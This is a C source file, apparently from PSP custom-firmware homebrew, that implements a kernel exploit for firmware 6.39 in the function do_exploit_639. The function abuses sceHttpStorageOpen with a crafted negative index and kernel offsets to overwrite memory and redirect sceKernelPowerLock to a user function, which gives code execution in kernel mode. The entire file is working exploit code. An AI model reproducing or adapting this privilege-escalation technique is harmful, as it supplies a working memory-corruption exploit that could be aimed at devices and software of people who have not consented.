#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>
#include "utils.h"
#include "printk.h"
#include "../PXE/Launcher/launcher_patch_offset.h"

extern int sceHttpStorageOpen(int a0, int a1, int a2);
extern int sceKernelPowerLock(unsigned int, unsigned int);

int kernel_permission_call(void);

void do_exploit_639(void)
{
	u32 kernel_entry, entry_addr;
	u32 interrupts;
	u32 i;

	for(i=1; i<=6; ++i) {
		sceUtilityLoadModule(i + 0xFF);
	}

	sceHttpStorageOpen(-612, 0, 0);
	sync_cache();
	sceHttpStorageOpen((g_offs->sceKernelPowerLockForUser>>2), 0, 0); // scePowerLock override
	sync_cache();

	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	sceKernelPowerLock(0, ((u32) &entry_addr) - g_offs->sceKernelPowerLockForUser_data_offset);
	pspSdkEnableInterrupts(interrupts);

	for(i=6; i>=1; --i) {
		sceUtilityUnloadModule(i + 0xFF);
	}
}

